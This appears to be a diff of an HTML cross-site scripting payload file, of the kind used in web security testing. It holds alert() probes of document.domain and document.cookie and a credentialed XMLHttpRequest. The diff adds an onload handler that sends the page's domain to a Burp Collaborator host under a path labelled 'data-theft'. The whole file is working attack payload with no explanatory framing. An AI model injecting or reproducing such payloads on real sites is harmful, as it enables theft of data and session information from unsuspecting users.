@@ -1,19 +1,15 @@
 <center>
 <script>alert(document.domain)</script>
 <script>alert(document.cookie)</script>
-<iframe width="550" height="500"
-frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen>
 <script>
 var xhr = new XMLHttpRequest();
 xhr.open('GET', "https://www.google.co.in/");
 xhr.withCredentials = true;
 xhr.onload = function () {
-    document.write(`b0rn2r00t`);
-    document.write(`document.cookie`);
-    document.write(document.domain);
+    this.open('GET', "https://pe7e8ebyukodq2s4cr61fslil9rzfo.burpcollaborator.net/data-theft=" + document.domain);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    this.send();
 };
 xhr.send();
 </script>
-
-</iframe>
 </center>
